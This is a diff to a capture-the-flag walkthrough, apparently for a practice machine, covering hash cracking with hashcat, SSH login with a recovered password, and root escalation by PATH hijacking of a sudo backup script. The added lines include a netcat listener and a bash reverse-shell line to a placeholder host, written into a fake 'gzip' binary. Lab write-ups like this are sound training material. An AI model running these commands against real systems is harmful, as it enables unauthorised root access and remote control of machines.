@@ -69,4 +69,26 @@
 
 #### 'admin' user is me and 'm4lwhere' user is the owner which we are trying to hack
 #### This hash can either be cracked by john or hashcat, I use hashcat here
-#### hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
+#### hashcat -m 500 hash.txt /path-location-to-rockyou.txt/rockyou.txt where hash.txt contains our hash to be decoded, -m specifies the type of decoding(Here it is MD5), rockyou.txt is the most commonly used popular wordlist and can be cloned from git
+#### Now that we cracked the hash and stored the password(ilovecody112235!) into password.txt file
+#### We can now login to ssh successfully, *ssh m4lwhere@10.10.11.104* and input the password
+
+![image](https://user-images.githubusercontent.com/52716626/136507101-0c4d3397-dfec-4a77-96cd-22abdfb687f4.png)
+
+#### Now we can cat user.txt :)
+
+#### Next step would be privilege escalation
+#### *sudo -l* on the shell tells us that /opt/scripts/access_backup.sh script runs on root, we should use this to make ourself a root user
+
+![image](https://user-images.githubusercontent.com/52716626/136507498-fe2b7c1e-1302-4529-b606-3a72802f8a55.png)
+
+#### We use Path injection or transveral attack to attain sudo privilege here 
+#### Give the command 'nc -vlp 7777' in Host shell so it listenes for that port
+#### Go to /tmp of reverse shell and run the following commands
+#### echo "bash -i >& /dev/tcp/IP_OF_HOST/7777 0>&1" > gzip
+#### chmod 777 gzip
+#### export PATH=/tmp:$PATH
+#### Now we would get a reverse shell with root user in our host shell
+#### root.txt can be found at /root ;)
+![image](https://user-images.githubusercontent.com/52716626/136508623-6f7a5b56-10f5-4166-97b2-b146efc62b6a.png)
+
